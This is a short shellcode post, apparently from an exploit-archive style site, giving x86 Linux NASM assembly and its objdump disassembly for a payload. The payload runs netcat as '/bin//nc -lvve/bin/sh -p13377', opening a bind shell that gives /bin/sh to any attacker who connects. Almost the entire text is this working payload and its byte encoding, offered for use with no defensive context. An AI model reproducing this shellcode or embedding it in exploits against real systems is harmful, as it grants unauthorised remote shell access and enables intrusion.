linux x86 nc -lvve/bin/sh -p13377 shellcode
This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker
Author: Anonymous
Site: http://chaossecurity.wordpress.com/
Here is code written in NASM
/////////////////////////////
section .text
    global _start
_start:
xor eax,eax
xor edx,edx
push 0x37373333
push 0x3170762d
mov edx, esp
push eax
push 0x68732f6e
push 0x69622f65
push 0x76766c2d
mov ecx,esp
push eax
push 0x636e2f2f
push 0x2f2f2f2f
push 0x6e69622f
mov ebx, esp
push eax
push edx
push ecx
push ebx
xor edx,edx
mov  ecx,esp
mov al,11
int 0x80
//////////////////////////////////
And here is objdump from which you can see the shellcode
//////////////////////////////////
teo@teo-desktop ~ $ objdump -d a.out
a.out:     file format elf32-i386
Disassembly of section .text:
08048060 <.text>:
 8048060:   31 c0                   xor    %eax,%eax
 8048062:   31 d2                   xor    %edx,%edx
 8048064:   68 33 33 37 37          push   $0x37373333
 8048069:   68 2d 76 70 31          push   $0x3170762d
 804806e:   89 e2                   mov    %esp,%edx
 8048070:   50                      push   %eax
 8048071:   68 6e 2f 73 68          push   $0x68732f6e
 8048076:   68 65 2f 62 69          push   $0x69622f65
 804807b:   68 2d 6c 76 76          push   $0x76766c2d
 8048080:   89 e1                   mov    %esp,%ecx
 8048082:   50                      push   %eax
 8048083:   68 2f 2f 6e 63          push   $0x636e2f2f
 8048088:   68 2f 2f 2f 2f          push   $0x2f2f2f2f
 804808d:   68 2f 62 69 6e          push   $0x6e69622f
 8048092:   89 e3                   mov    %esp,%ebx
 8048094:   50                      push   %eax
 8048095:   52                      push   %edx
 8048096:   51                      push   %ecx
 8048097:   53                      push   %ebx
 8048098:   31 d2                   xor    %edx,%edx
 804809a:   89 e1                   mov    %esp,%ecx
 804809c:   b0 0b                   mov    $0xb,%al
 804809e:   cd 80                   int    $0x80




